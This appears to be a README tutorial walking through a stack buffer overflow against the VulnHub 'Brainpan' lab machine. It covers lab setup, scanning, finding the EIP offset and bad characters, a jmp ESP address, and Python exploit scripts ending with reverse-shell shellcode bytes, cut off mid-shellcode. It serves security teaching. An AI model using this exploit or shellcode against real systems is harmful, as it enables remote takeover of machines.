# Stack Oveflow

**Stack overflow attack** is a type of security vulnerability in which an attacker exploits a bug in a program's memory management to overwrite critical parts of memory and take control of the program's execution flow. In this repository you will learn how to perform a stack overflow attack on a vulnerable machine called “Brainpan” from VulnHub. We will use a combination of tools and environments to exploit this vulnerability and obtain a reverse shell on the target machine. This process will give you an in-depth understanding of how these vulnerabilities are exploited and how attackers can take control of a compromised system.


## Getting Started
To perform the practice it is necessary to configure our attack environment, so we must install the following tools

#### VirtualBox 
We will use VirtualBox to configure and run our virtual machines. It is a free and open source virtualization platform that allows you to run multiple operating systems on the same physical machine.

#### Kali Linux 
Kali Linux is a Debian-based Linux distribution designed for penetration testing and security analysis. It offers a wide range of pre-installed tools that are essential for any computer security enthusiast.

#### Windows 7  con Immunity Debugger
Immunity Debugger is a debugging and code analysis tool that will allow us to inspect and manipulate the memory of the vulnerable program to identify the stack overflow vulnerability and create our exploit.

#### Python
Python is a powerful and flexible programming language that we will use to write the exploit script that will allow us to obtain a reverse shell on the vulnerable machine.

## VirtualBox configuration
It is necessary that for each one of the machines that we use inside VirtualBox, the following configuration is made in order to have access to the machines by means of the network.

On each machine, in the network option, select the bridge adapter option. 

***Brainpain***
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdTm2ZtYJw6Rb0HzV9jPkOJSXe9p3-MuFJEThWWe05u0dRbQzk4LT0Nwp57HjXRWitEb9G7U0KXZVmmg94QUmnpsVmcs1zt98rKBogE12gmDbZsZcCaL6onfDuKUbr4Hp8LoEFTuJVLy10pJysfky0EiHwU?key=7yZZI6nZ3Oixa1gtoznlDg)
***Windows 7***
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfJuaqKzPFCvCXDfMcCve0QXgjJQFOrnymRQP9YckOtiMKr4Gjpre-LO6tS8DEhUByJllNcW37PpRD1PsYL6TAJhL03hI5yNOLOiH0SLTwpH0ubi1m391vxgEt8icHzmj9AykvOQ66ZKkrZgzKDJH4YpwCF?key=7yZZI6nZ3Oixa1gtoznlDg)
***Kali Linux***
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfQZKqDf-I7mq5V9JQKeJnSndQ8Nl25zYZZdNSzJ65W3fy8_Zg02XYRbHqdUH9GrNU-a_2zbghXd59GDtyoPmGoVnoIyi1EJHI2VAfFdhm1QRDQgWuevAbs152ZzxFyF9g0XrLad8B0Bsvv8FHZ2hyG0R6H?key=7yZZI6nZ3Oixa1gtoznlDg)



## Windows 7 machine configuration 
Since we will be working with several machines it will be necessary to share some network resources so we will have to disable our firewall on our windows 7 machine. 

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXe5TOZqPqi51nhGgwMSt4jZn749sM7R87KwVoU0lZ0ESKxWMO2X2e_-UkxOIheq50g75-7CVySZ7WqzHOy0ebpGNhKG8uSLOIjJ3lAVHOLTUcz9Vkmfz0qfdsmoHLb9CRHqYSiSeGCkTTfYTT-oOw47Qh4k?key=7yZZI6nZ3Oixa1gtoznlDg)

## Immunity Debugger Installation and Configuration
Our first step will be to install Immunity Debugger on our windows 7 machine, download the program from its original website. 
[Download link.
](https://www.immunityinc.com/products/debugger/)

![Imagen 1](https://lh7-us.googleusercontent.com/docsz/AD_4nXe7bibFU6biqYfbmJVp3d4ACRWwWyyOAhgpC5iK5bqvyn_lbyARgXYONz8mRxJpibJ2nODrYJmhIB0Q4secKNXt31o2IWYU7bvU3e6Vc4b_ceViJ8PrIB2rhChorAz22IbQrGMFFoh8yZpqKtlieVm122Vh?key=7yZZI6nZ3Oixa1gtoznlDg)

Follow the installation steps, and accept the installation of python 2.7
![Imagen 2](https://lh7-us.googleusercontent.com/docsz/AD_4nXconO9eWjp-Q970ryfk5ek_e9oMCqu-XHf2_Q8FEFxJ684eEeGixWqAUCtPsLottYFLup5-WpatSS-To8Nsgq7ipVB3QeMNzfUbUFJDwrKElnB7n7hjZyK3NauIxGHpB80DZOdQxUEHCN70E21op8qJyEZZ?key=7yZZI6nZ3Oixa1gtoznlDg)

After the installation, it will be necessary to import into our program `mona.py`

We access the folder containing our program 
![Immagen 3 here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfr-KP5BYSkX5a8Fp6KMvICXH0toEyF5Et-cMo0uDQ-B6DOdYexik_VUlHSuHSCCyKbZrzvFGKLFLHtiOVzgyoaZcn5RTImyQuOKrC9Qxai6ELaaZlYMtH52RGJ1jeZPSatiaa-cpfy-t9G3QLWoOOYjpA?key=7yZZI6nZ3Oixa1gtoznlDg)

And inside the pycomans folder we copy our `mona.py` 
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfMlgxF8ZYlRUvDpFFJkddiKmZnGfGkFV6-w9wPxO25b2chCVEZeWu0XQjWgiOhZ4Ap_k08HGEfi5dTRmorLItQ6vvgtlqyuO7ChHcU3948PwglK7kNHeQa4rq4tAImpQKoqFCkt-LYWZe-TX3FYdy6yQzu?key=7yZZI6nZ3Oixa1gtoznlDg)

## Brainpain machine scanning
To start any type of attack it is necessary to perform a reconnaissance of the victim machine, in this case the brainpan machine.

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdqRyIpxY_oQsIw_YIMfj25Tpsm2Bpk6VNTdE4G_hKJVVakog3cOD-JEX7PXi71MFFZzZ7SVpqvjIkyGQD_UVsxWUuIQE61IreOILDDvrqAPV7mYa8NpMGafjnPpOmqXQDLeIRzLY6LZwIaY4KsSBFgiBF2?key=7yZZI6nZ3Oixa1gtoznlDg)

### Identification of open ports.
In our Kali machine, it will be necessary to recognize the ip of the machines running at the moment (windows machine, brainpan machine), for this we can make a sweep of the network to see the connected devices. 

    arp-scan -I <interface name> --localnet

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXcD0Q4Ttxnq5SyZEjqHTToQzTrIYobDmoiuaBfAi8e2YbD8dHm3GWg-ytUpCVQqKHPPbpQvVGUs9UOiIAmq0o0YhgUb3ShRNJI4V3rDSzFU7R5qOttTdSbsaF-BBoKFMw4svKYvPsb37Hnm08p3b4_Dr4NN?key=7yZZI6nZ3Oixa1gtoznlDg)

then by means of the ping and with the ttl that they return us we can identify which machine corresponds the ip. 

    ping -c 1 <ip address>

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfJt5mZpYitUgu7oy1zVYaGfLYQCQPHfUsbwxPOX10iqM4Vak5AgGx7GAybfvtkXC2qikGHV-NAq5TzFiSfbwqkS3Fp0N_i6Fg49OpL7Yc6nBagg82cLK8bnVyCelp4JI0D0BM6FuiE3zeGNT0YVrz5VGw?key=7yZZI6nZ3Oixa1gtoznlDg)

After identifying the ip of the brainpan machine, using nmap we scan which ports are open.

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXclHxJ9RUC6JUXz-vpGjTssVOaP1sDQyqsGGs49mJnGWjM-dv5FgYXw-8QIkrrKfNw-iqdgrcfrOPU0kU_ObQKajgT0RRKe1MFOQz175DH6NPnvpODpf6Vu4auIedZXE4_0WCWkkHcmiVs0hOlyVmkVLz0?key=7yZZI6nZ3Oixa1gtoznlDg)

as we can see the open ports are 9999 and 10000, using the browser we can search what is hosted on those ports using the ip of the brainpan machine. 

Port 1000
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeELPyBC6HOgCzkn8k4wq5Cqx53N13_v12gV1zPvBqJhfNO0cGlOov-OMvefk5AxmytdJSC7ZXptd7UTg1PAzsmwuy-pJ-V7llzgjAy0lz2ro61g7NryBOrdUeTL57PW-uPZ7q1OpsOhZzGXM3FbU-lvTO2?key=7yZZI6nZ3Oixa1gtoznlDg)

Port 9999
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXepTy7Pg7irnPY1RgU5f9EX4QYfPgTHgx2yVsbfBbP3mnrJBtHLCC5STeKuLAudih_IUy5_LP82tOqQNjZD-Jw0zlBlerUcT5Hd2kcKqSWDkGLPVwBgBfm8krhsNMUAxiPmgT03gChX2-qqWCgfvsVh_f5R?key=7yZZI6nZ3Oixa1gtoznlDg)

### Web fuzzing
Now we can try web fuzzing the page in order to find which directories are active. 

    gobuster dir -w /usr/share/wordlist/dirbuster/directtory-list-lowercase-2.3-medium.txt <url>:<port>

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeX_Bj3JSAiKuogY_3v7FqYG6Brq3rz9LKOENl4r_yM8_MRaRVoc2Qirvbq-nUw90Y-FGwdI6mRtWflWpU1UwAZVfUtLrzTjo7FLHgxYQji9Nh2CsNsaUEd3tp_6N9Wf3almu2sO-QOACPCs4v9dXgG1dKI?key=7yZZI6nZ3Oixa1gtoznlDg)

It is identified that the `/bin` directory is active. 

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdBOxpFLrV4fdw74KBO93IQDj6lPIa3DPU7MCtkxiAuU2x_Okt76RsN9l8k7YOBj5tP6MwnVxifRdR-sfI-nSssgXs5oIhEtVENfp3mU50d03PSwNcgPCs0hDjeAbWnolDFTNQA7Pjh3bslPAkUYlch8v8d?key=7yZZI6nZ3Oixa1gtoznlDg)
This directory contains the binary that we will use to debug locally on our windows 7 machine

### Share binary to windows 7 machine

To share the found resource we are going to create a python server to download the resource on our windows 7 machine. 

    python3 -m http.server 80

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeUVMnhQ97LCeJmjv0hvEZ1_MpwbaCjVikDRx08hWANx0RyB1sKqpFQaSR7iM5Q7GmFYEfBvhLK6opKPPjq1_yiGdowyPbPvnnnje1gYSeFbx7LskhVUTanxmt7nuReFOqLu870R63ohWSfH_bRSCXuVlJq?key=7yZZI6nZ3Oixa1gtoznlDg)
Using the ip address of our kali machine, we access the shared directory. 

    ifconfig

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfUs2rWI4VdpIwEZ_qGrNoToBvt0Cq4XBSf61_PF2alf1upm1pJOGlybPxLfg0UDGYysk0qc9jqYelZlkIR53MbbDSsY6UQNywa1x6Gw9yB4wG3McFkicpTp5iJD3rYyyc_YStDOgusNtPYz9zqsUGW4WZo?key=7yZZI6nZ3Oixa1gtoznlDg)
With our browser on the windows 7 machine we write the ip and we download the resource
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfVOfrjde6kYu6NfaNjb41me7nvy4WRrdVdyAnwb2bsLIq05_LPaOsSNzsNkzniXF0J3ToUkDpMmvVsgcbVMZ_SifzvynOVJ5Fw5lU7VF-Cf-9mzAIDG4sH997BGfSKns6Wj4KtHkiKA-GQdGsIjF-LObFK?key=7yZZI6nZ3Oixa1gtoznlDg)

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeZuf9s2wOBCyjJ7O2hPMkjGmnhJ0WuHz9bG-q_-s86mrrOQ-0HmRABhJeDDlLh0Go4moYY7csLDuIJQcUiiNtrdbKNlEl9Y-v1N4JPqoyywJrXaCIwrUY93LTBIfGbnpEmNSPISD_bMvoJwbo5_7M2-7E?key=7yZZI6nZ3Oixa1gtoznlDg)

## Start brainpain on Windows 7 machine
This is a process that can be performed multiple times, so this section is intended to explain it only once and when necessary you can follow the same steps.

run brainpan.exe

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdVLKQIqCrZ5Q13tbFkACGGnRldsiA-JrqFIRUeehLSGcvHatjf43e8pqwDe-tj4EEuRfdQtlgZ6wBA4sibTU9sRR05re-J27N_mYoZGdCxPWlnGak0Fj5F5ZIUCUhcPmgvftKZNSTL__KgsX70h8wP2TUv?key=7yZZI6nZ3Oixa1gtoznlDg)
Start inmmunity debugger 
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeW4nCkgN7U2P5H6lDJ-W5z5nhsp2ScEhtm8_omQyLNpd3BnVzmAhZqjQIiJwQPt2UBlII4EdUzvYabiT5i3m5Z2Nd31DwQcreVyljlWK5z9u0Zijd1QK9E53e0UdI20_zTIjAd-YbsI3xk5MdohEg1T6VF?key=7yZZI6nZ3Oixa1gtoznlDg)
click on attach
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeCg2flpxM_OalPn37yT2VCedWsJnRYrvq-uH9vyKbjZC5FP5z5192ytdFdg5O1aciuBiS14ipkCrIRA1Wo5ULItL-X_FmjZsL3doQYC3zIj6D2S71uRz9doSa3uPlDqSs2t8UyF2S-cAWjDafY7geUMMLm?key=7yZZI6nZ3Oixa1gtoznlDg)

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdD6r6rgmWuMpb7gp8JIe4oUUJvXPlkOCVPM6-kzYvpsDd_EPiN5O9hdpiN5IAJyWeQIOGXlXfsue4ORaJ-wrTxSn1BX-sKd12aYj__LxYsxRZc67ukC8Ft2epgTLIgOcHVa9pZ5n5mux1zA_rl9i6egHH7?key=7yZZI6nZ3Oixa1gtoznlDg)

In the upper part we click on the play button
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdYoq7ngaZ1nQ7eurVs8RgWGY24qvaLTcpKrlufi-MLrOy30t5GKzBVEX9Kr0OYAuYvoStMvl6jTfHInhBgf48wOxNiDRNMx4ceQtS_9yBziP47t9grJ4s4s3fzqyT9YhNLssucmIqRdVd2UBHyZaAY5Iez?key=7yZZI6nZ3Oixa1gtoznlDg)

***Whenever the document mentions to restart brainpain on our windows 7 machine, it will correspond to close the debugger and do the previous steps again.***

## Get Offset
On the kali machine we connect to the brainpan running on the windows machine

    nc <ip windows 7> <port>

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdZv8OjR60XDzGljTjPI_zY8QegUrLQCIEj3Rw2NoDItsAMfPMVaNx3TBZR6R7rmFT2eGZ7EWnJa2IeXQYk9HlHP5lNUToLQ21G2zlfGv4t-0y44abFcf9VuRQ4vVBbe24h0220AQnDP9OrJumvPj7cwI8?key=7yZZI6nZ3Oixa1gtoznlDg)

We try to enter a string of a long length into the executable
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXcTxY8rQ_iLNXgHnycxTJCJPjblSP25MijGV_8tVGeBE-8PDhbv4Uuco2qBTie7kzTiJnPtJ3mUWYSnkHxS2IKAeCU3WlXpY6J_zAHBq1mbI9Vdc8V-3kzOErJMt_mAlxRMYjgFDd496p7o3dQJr2CwjFX_?key=7yZZI6nZ3Oixa1gtoznlDg)

and as we can see the status has changed to paused inside our windows debugger
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXebEMml1dmC5dtodBoF4EiH2TAVBENARHk42s6oKPuQEr85V1B_wIj3JHWW85qAhjz9HLfFE3ADj1mad3QY5N6qNsa4MqOMJ66IR9PnfnCN5UEjg0Vf8DH471CXtoJit4WcV5MYLgB4pSCPldC_9XmQ15Ax?key=7yZZI6nZ3Oixa1gtoznlDg)

offset number of characters needed to get to modify our EIP.
We generate the number of characters needed to find out the offset using metasploit

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfqAtl6-1ot1JtmgX75yhUjzNykopjo1xvLs3yY529FqfhK3CJOYeXkzn8bbtT4MLSy9UbiD4OAmvfaZorD0Mw-OgC1fYYp6qorswlbGa-7PFVyUokYptoqNyYzjyhtYn-fNX94blGhbPzU6eZz7OjWzCS1?key=7yZZI6nZ3Oixa1gtoznlDg)

We reopen our brainpan and debugger on the windows 7 machine, pass the string generated in metasploit and pass it to the brainpan

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXc9s-BPgk_koVOPIcXrmbtQytRhL-gDqJU7kRHXmnxL-99G-j3ilbZ_fhJ9e9qmBkBgV-FeOTQRFd28VGQBXPYAh0860qrSaBnpj5NMjnT-BRMm2o6ggh8Ho9QLqkSVzua8NRkImB2D1-Ssj8v0b9EASYsW?key=7yZZI6nZ3Oixa1gtoznlDg)

and in our debugger we want to know the EIP generated, to use another tool to find out the offset. 
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeMJuH_exxC30QFgnGsHXrmJgpZcQQCUV9nLvj5SDXmLAVA9mvOB1Wl1htUpQFvrRgsTBk6VUvOR7TzwHvfL5xZKUDz8Q49PqSHXi7OMx0mDZSxmwDptPfzhmKxunyiBzTh2aTHSAhU1SYQYZdD0NXeylpe?key=7yZZI6nZ3Oixa1gtoznlDg)

using another metasploit utility we pass the obtained EIP, to obtain the number of characters needed, before modifying the EIP


     /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfmG8oATHekZ5byAhNkjUhK1oRwakvKwy3Vu2L-BqcC-qTsuwAYM5Gc2ws3CLGPfpLwjezkPKs4Obn2EYqSM_B_fO_Fs2n49sLaD_VT_qyofz-xdhVJXYfz3d8EgypFMGLNTDqJepdRC0jDWx-CDeeOdR7u?key=7yZZI6nZ3Oixa1gtoznlDg)

we generate a string of 524 A and 4 B characters to verify if we can modify the EIP

    python3 -c 'print("A"*524 + "B"*4)'

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXe5PzPPMWPuUkuEoQVqXV3UesiBEMCohdgh_KEb5ECPQ_dLUdXjYrltYA3xwUUP-D2AjsUZ5wAF6PblGPusEmPX9cPh5StkhALvEMNeh4ghmVsIdTE8NdxrfQQElAGdmRBOxZqfN1tf3_gjN1jxg0F1oLX6?key=7yZZI6nZ3Oixa1gtoznlDg)

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeLhv_angBs6_zJbDiY0UMqzRMDB-Qk3wSTpTsMvbswACFyTbIXtm0bPayuSvPCfKEKWYK7YxGQa3P5WkeYnPtAp7UVoRxGvfA4JKqcqopWU-pfBd-pyKuRGWTjYRjplUB7AFhyM7y2aPSy--G2qkSPgxg?key=7yZZI6nZ3Oixa1gtoznlDg)

We verify in the debugger what is the new value of our new EIP, and as we see we get a value 42424242 HEX which is equivalent to our BBBB in ASCII, so now we can modify the EIP as we want.
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXf-qDNh3O40dRif_6Qkt_r9v0CoE6rF3rVTlbjIioiiYbGCj_hCsDhYoD717OsDzClSq8TAQZmVgUsoF-3iy-SmjGhp7NykKn5jvZZqwa3z0k7Iv-Ou0o4fkeGjxOvYZwxnv11GqK2TPj07YhGc5Wx_9ZTD?key=7yZZI6nZ3Oixa1gtoznlDg)
Now we are interested in knowing where the rest of the characters are located after filling our EIP, so we generate other characters to place in our debugger

    python3 -c 'print("A"*524 + "B"*4+ "C"*250)'

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdmljtYJlS0WadlmkXv5xYrxWo9IMNFbhOI9JPcHRCyZz0jaKNKgpI59Q0pKHLfHHP4PO7lcFLCweVhGhrYXpceSOzYXnW8-qS_rl3qe1V75NGOOMdpPCLxevYFY7Fx-TEnoR3khJtHBFpgikyQhR_EFQQS?key=7yZZI6nZ3Oixa1gtoznlDg)
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXd8o3saVVb6_M9MxHkE9YulLeI7c8CFCRDy1UpkHqaWYwcGwjZoeD68CvucyvAe43Kaq2_y9XFsm0-OtFpUBpWN9hMYHd6VqwxKkOfoO0kJoYhwaOV5DM0t45I2NVSnMOgebuhe8L8yN2n9KyytallKuse0?key=7yZZI6nZ3Oixa1gtoznlDg)

as we can see, the entered c's go to our ESP
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfns4A-0BEQtZl1s42J_g_XT60M5YnuAMyxRPP3CNAQopESiYAaiG7eKsPwAjIj2Qf5WVwwC1k9yCNjDXyW7EpocaVj-z4VyNbrSgRzuVBKGuAiDoDImSjSugpNLAJauMKl5oyLaxO8XPC29PSZ4h5J14Wb?key=7yZZI6nZ3Oixa1gtoznlDg)
## Badchars

Now we want to know which characters are not supported by our binary, so that we can generate the correct instructions to access a reverse shell. 

### Mona
We set our working directory

    !mona config -set workingFolder <directory>%p

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdtD-7Hba_NLM6lhh0jYKB-Tm-wEdKXeEjFlxHTVeXqlwUs88F4akOoPmhdYZghjzkw-MmbE_n_AcNqEVaBEyReyLcTyrqEW51knFM_viNHn9KIzBQARs3P7aTC2NdBZiV2pcFd3wqUKRMNueuqb2PUq1md?key=7yZZI6nZ3Oixa1gtoznlDg)

We generate the characters, except for the null character

    !mona bytearray -cpb "\x00"

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdXE94m8HdQbCK6z-j6ScQhF4OtX4IOlxdtOOCbb4Zj2vv_SryQe08DNBw13QfpYq3f6dO_D33cWW9A8LOkh22uV5n6lEvehvJpsXgey-mTvshkb2p1Tm-r2rOVubIDWezqXJef7DU7GaumX4tK2gwvARI?key=7yZZI6nZ3Oixa1gtoznlDg)

This generates a .txt file with the badchards generated, we are going to put them in a python script that we will later modify to obtain our reverse shell

But first we must share this file to our Kali machine, where we will create the exploit. 

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXefZdtGrDtMvSMtOa7vJjggze-gdozTwe-Kz0xQBOH56D42z_NU0W8qvlSRfTOfBW6hMCpDhWYwnsNIzcE0KRsaJVrQEf6WOs_8_4-fkGxFsYRvk3H1XR63raS5332SsEdQn4lNJxE8rfQE1uEvi-_jFehR?key=7yZZI6nZ3Oixa1gtoznlDg)

we create our `exploit.py` where we will have the offset obtained and we will pass our badchars 

### Python exploit initial

    #!/usr/bin/python3
    
    import socket
    from struct import pack
    
    offset = 524
    
    before_eip = b"A"*offset
    eip = b"B"*4
    
    
    badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    
    payload = before_eip + eip + badchars
    
    # Conexion con socket
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("remplace for ip windows 7 address", 9999))
    s.send(payload)
    s.close()
We give run permissions and open our file

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXekiqrTO65yYrv3HELTy4PvXALl87Owy4jNP1a9M-ZOS7yoE6zGhRc3KYI_lOzK6hmZZaYe9ayzRtsFLwGgli-NMpzj3NnIhny9mc62Aji2PO9yUcifvTtkMndFXIIVCAHaBZ1F-7zoYyEEs3nodATfxdqI?key=7yZZI6nZ3Oixa1gtoznlDg)
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeBPptsq-qaDudAi2Na6aEt7LSoTmj0c7wi5YDAG8MkZJyzWHXViSyPAkXcoB2owQWdMtK-XO0Z13gCmA-zI3-O3hbZB-ON2O4y7FVeP_UcbHWV5zRTwCmR5K4g7YriGnBvWlLNWtn6YHnrPW_c_Hu0kBRH?key=7yZZI6nZ3Oixa1gtoznlDg)

We go to our debugger and we stop in ESP right click flow in dump ESP
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXcazHn21fFE_0PvM1UAHDGedTK1_DGeYpnmYGBc5UucND9-ZstpAEQ5cqLK4rQ8vtwpz3nydJtSEs9NHyK3vayJqwMDznj-hVyZ6yaffcik71lNZxO71SllhP-TBWIreTgr7VA6c1oYN0r5zQHeZYhUm47U?key=7yZZI6nZ3Oixa1gtoznlDg)

As we can see you can see the characters that were entered in the payload, but we need to compare that all the characters have been entered but doing this manually would be very tedious, so we will use a tool that allows us to see the characters that have been entered in the payload, but we need to compare that all the characters have been entered.

We pass the ESP address obtained in the command below `mona.py` and compare using the .bin that was generated for us previously

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXcPjXep3tnVa7xt3RJEaEFQut0qSHVvt4XKt7caasYQBIo8au6F72PICPAP2O_lQEJo2Kc6D-_vTvq-fx8WSPeYMry6rVOU7fYH0kD9Q2CMRs4QYTSEJjm-NLJWUMjmaBT8xHtu96gQtH0vsY9EVdMgUS6h?key=7yZZI6nZ3Oixa1gtoznlDg)
As we can see, no character is generated that is invalid for our program, so we can proceed.

## Get opcode from jmp ESP

In order to inject our code, in this case the shellcode, it is necessary to know the memory address where a jump to the stack occurs.

We find out the jmp ESP opcode
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXfBwwNmY-noKUHcrC1phdAuSvxk2Uu7Up4_87a4nbs6rUp570xL83Z7RPEu9SbiOhDNK6OFbFWcYusQUwLdjHKVqvkLXj4OMR2uaHs4XoK2JbfgM5V5Yys9D_XmYnoRHLzrY_dZWeL5JJ_w_96BSbRq8Zs?key=7yZZI6nZ3Oixa1gtoznlDg)

Using `mona.py` we locate the position in memory where the opcode is located

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdIoUcBQSKbwBa0AQdO1ojGxQs3fz62FquRwTjMWvPXI5laRGfp0pcJlZnQc1a8Hduptj8W3fo1ZjxAhS5acV6RLhBtME_61BIH8UMUOUVwoRER1wZ4mQVPpUfGrnN2gXfdmz2IkIjRBMjDYJC9hahZif6L?key=7yZZI6nZ3Oixa1gtoznlDg)

I look for the generated address, and as we can see it corresponds to the jmp ESP instruction
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXd6qyWPScIpc0ST0qlwXVjxCEjEDdhrn2Z8ioojIsEGKlegn2o4YU_PAZd6YwEIFpnPAsoX4Yn5aJPulI9rD_iLStlswSyf_XOl1TjM6TMSYhyUsQ_zdOoKuDBOGthIPdqKeXKBfN80ZIbkYziPEFIX-yDP?key=7yZZI6nZ3Oixa1gtoznlDg)
![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXcbS8osTAOA9kAzeZAoMrH5DvM1IkwntkEqcP9LY5svNpXQOWRYBhtv-weCnBh_bK_LzjCDfV6lUrLBZuzElqwhxlRpW4mRctXAJEdbFHBJqeXnmuvFxh5zzJaSgoKh4w0awRKz0vQL5nIB87EbGbBdIAL1?key=7yZZI6nZ3Oixa1gtoznlDg)

## Obtain Reverse Shell
Now we have the memory address where the jump to the stack occurs, we have to generate our shellcode and modify our python `exploit.py` script to finish the process

we generate our shellcode

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXdHFcMJ_kBHkYscb5RR3RNJwF0upI7SS9Sy-gZm_XkziOYxLrJTRhdA4am9cJiDJlnPsTbxdyI621ASghSlUwQ-rOOG4Dez375XjFwQQYuZu3DRWmXTkTswS8dvAIMhtcgV6rvW_PoeSXHkyotw-xcz2vw?key=7yZZI6nZ3Oixa1gtoznlDg)

We modified our python script to use our shell code, in addition to the address of the stack jump that was obtained

    #!/usr/bin/python3
    
    import socket
    from struct import pack
    
    offset = 524
    
    before_eip = b"A"*offset
    
    eip = pack("<I", 0x311712f3) #jmp EIP
    
    shellcode = (
        b"\xda\xd3\xbd\x26\x37\x98\x45\xd9\x74\x24\xf4\x5b\x33\xc9"
        b"\xb1\x52\x31\x6b\x17\x83\xc3\x04\x03\x4d\x24\x7a\xb0\x6d"
        b"\xa2\xf8\x3b\x8d\x33\x9d\xb2\x68\x02\x9d\xa1\xf9\x35\x2d"
        b"\xa1\xaf\xb9\xc6\xe7\x5b\x49\xaa\x2f\x6c\xfa\x01\x16\x43"
        b"\xfb\x3a\x6a\xc2\x7f\x41\xbf\x24\x41\x8a\xb2\x25\x86\xf7"
        b"\x3f\x77\x5f\x73\xed\x67\xd4\xc9\x2e\x0c\xa6\xdc\x36\xf1"
        b"\x7f\xde\x17\xa4\xf4\xb9\xb7\x47\xd8\xb1\xf1\x5f\x3d\xff"
        b"\x48\xd4\xf5\x8b\x4a\x3c\xc4\x74\xe0\x01\xe8\x86\xf8\x46"
        b"\xcf\x78\x8f\xbe\x33\x04\x88\x05\x49\xd2\x1d\x9d\xe9\x91"
        b"\x86\x79\x0b\x75\x50\x0a\x07\x32\x16\x54\x04\xc5\xfb\xef"
        b"\x30\x4e\xfa\x3f\xb1\x14\xd9\x9b\x99\xcf\x40\xba\x47\xa1"
        b"\x7d\xdc\x27\x1e\xd8\x97\xca\x4b\x51\xfa\x82\xb8\x58\x04"
        b"\x53\xd7\xeb\x77\x61\x78\x40\x1f\xc9\xf1\x4e\xd8\x2e\x28"
